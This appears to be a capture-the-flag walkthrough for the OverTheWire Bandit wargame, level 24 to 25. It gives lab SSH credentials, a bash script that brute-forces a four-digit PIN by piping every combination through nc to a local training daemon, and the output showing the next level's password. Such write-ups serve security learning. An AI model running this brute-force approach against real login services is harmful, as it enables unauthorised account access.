# Bandit Level 24 → Level 25

## Level Goal

A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.



```
ssh bandit24@bandit.labs.overthewire.org -p 2220
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ

nano /tmp/brute_forcing.sh
#! /bin/bash
bandit24_pass="UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
for i in {0..9}{0..9}{0..9}{0..9}
do
	echo $bandit24_pass' '$i >> /tmp/combinations.txt
done
cat /tmp/combinations.txt|nc localhost 30002|tail

/tmp/brute_forcing.sh
/*
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Correct!
The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG

Exiting.
*/
```

